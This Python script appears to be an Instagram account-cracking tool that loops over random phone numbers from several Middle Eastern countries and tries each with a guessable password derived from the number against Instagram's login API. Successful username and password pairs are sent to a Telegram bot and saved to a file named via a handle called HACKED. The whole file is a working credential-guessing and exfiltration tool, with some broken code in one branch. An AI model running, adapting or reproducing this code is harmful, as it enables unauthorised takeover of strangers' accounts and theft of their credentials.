import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        Z = '\x1b[2;39m'
        G = '\x1b[1;32m'
        sleep(2)
        P55 = pyfiglet.figlet_format('weaver')
        print(G + P55)
        sleep(1)
        os.system('clear')
        sleep(1)
        bnar = pyfiglet.figlet_format('weaver')
        print(G + bnar)
        sleep(1)
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        E = '\x1b[1;31m'
        G = '\x1b[1;35m'
        S = '\x1b[1;33m'
        webbrowser.open('https://t.me/AIODZ')
        print(E + '[' + S + '!' + E + ']' + G + ' IDπ­ ')
        print('\n')
        ID = input(S + '  πΈπππΈπ ID β   ')
        print('\n')
        sleep(2)
        token = input('- Enter Your Token Bot : ')
        print('==========================')
        ask = input('[1]IRAQ\n[2]Egypt                               \n[3]Jordan                  \n[4]Saudi Arabia              \n[5]Lebanon                          \n[6]iran\n[7]Syria\n============XP_3Y=================\n[+] Ψ§Ψ?ΨͺΨ± Ψ§ΩΨ―ΩΩΨ©  : ')
        w = 'https://pastebin.com/raw/xPfV5eKD'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=Ψ§ΩΨͺΨΆΨ± Ψ¬Ψ§Ψ±Ω Ψ§ΩΩΨ­Ψ΅..... β@AIODZ").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'weaver' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        if ask == '1':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+96477' + us
                password = '077' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODZ- @AIODF"
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @XP_3Y_1 \n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODF| @AIODZπ₯")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        if ask == '2':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+2010' + us
                password = '010' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODF- @AIODZ"
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODZ \n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODF | π₯")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        if ask == '3':
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                username = '+96278' + us
                password = '078' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODZ - @AIODF"
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODZ \n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODF |  π₯")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

    if ask == '4':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+96655' + us
        password = '055' + us
        url = 'https://i.instagram.com/api/v1/accounts/login/'
        headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
         'Accept':'*/*', 
         'Cookie':'missing', 
         'Accept-Encoding':'gzip, deflate', 
         'Accept-Language':'en-US', 
         'X-IG-Capabilities':'3brTvw==', 
         'X-IG-Connection-Type':'WIFI', 
         'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
         'Host':'i.instagram.com'}
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
        if 'logged_in_user' in req_login.text:
            zz += 1
            print(G + 'username ==> : ' + username + ': password ==> : ' + password)
            tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODZ- @AIODF"
            i = requests.post(tlg)
            with open('insta.txt', 'a') as (HACKED):
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
    elif '"message":"challenge_required","challenge"' in req_login.text:
        print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
    else:
        requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODF\n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODZ | π₯")
        print(E + 'username ==> : ' + username + ': password ==> : ' + password)
        aa += 1
    if ask == '5':
        while True:
            us = str(''.join((random.choice(user) for i in range(6))))
            username = '+9613' + us
            password = '03' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODZ- @AIODF"
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODZ \n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODF | π₯")
                print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                aa += 1

    else:
        if ask == '6':
            while True:
                us = str(''.join((random.choice(user) for i in range(8))))
                username = '+9866' + us
                password = '66' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODF - @AIODZ"
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODF \n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODZ | π₯")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        if ask == '7':
            while True:
                us = str(''.join((random.choice(user) for i in range(7))))
                username = '+96311' + us
                password = '011' + us
                url = 'https://i.instagram.com/api/v1/accounts/login/'
                headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
                 'Accept':'*/*', 
                 'Cookie':'missing', 
                 'Accept-Encoding':'gzip, deflate', 
                 'Accept-Language':'en-US', 
                 'X-IG-Capabilities':'3brTvw==', 
                 'X-IG-Connection-Type':'WIFI', 
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
                 'Host':'i.instagram.com'}
                uid = str(uuid4())
                data = {'uuid':uid, 
                 'password':password, 
                 'username':username, 
                 'device_id':uid, 
                 'from_reg':'false', 
                 '_csrftoken':'missing', 
                 'login_attempt_countn':'0'}
                req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
                if 'logged_in_user' in req_login.text:
                    zz += 1
                    print(G + 'username ==> : ' + username + ': password ==> : ' + password)
                    tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=ΨΉΩΩ ΩΩΩΨ± Ψ΅Ψ§Ψ―ΩΩ β .\nβ\n πΌπΊπ¬πΉπ΅π¨π΄π¬ : {username}\n π·π¨πΊπΊπΎπΆπΉπ« : {password}\n- Dev : @AIODF -  @AIODZ"
                    i = requests.post(tlg)
                    with open('insta.txt', 'a') as (HACKED):
                        HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
                elif '"message":"challenge_required","challenge"' in req_login.text:
                    print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
                else:
                    requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text= - -  Ψ§Ψ―Ψ§Ω ΩΩΩΨ± ΩΨ΅ΩΨ― Ψ§ΩΨ­Ψ³Ψ§Ψ¨Ψ§Ψͺ  @AIODF\n ππππππκ« β [{zz}] \n------------------------------------------\n ππππππκ« β[{aa}]  ( {username} ) \n Dev β  @AIODZ - π₯")
                    print(E + 'username ==> : ' + username + ': password ==> : ' + password)
                    aa += 1

        else:
            print('Ψ±Ψ§Ψ³Ω Ψ§ΩΩΨ·ΩΨ± ')
        print('ΩΨΉΨ±Ω Ψ§ΩΩΨ·ΩΨ±ΩΩ')
        print('AIODZ')
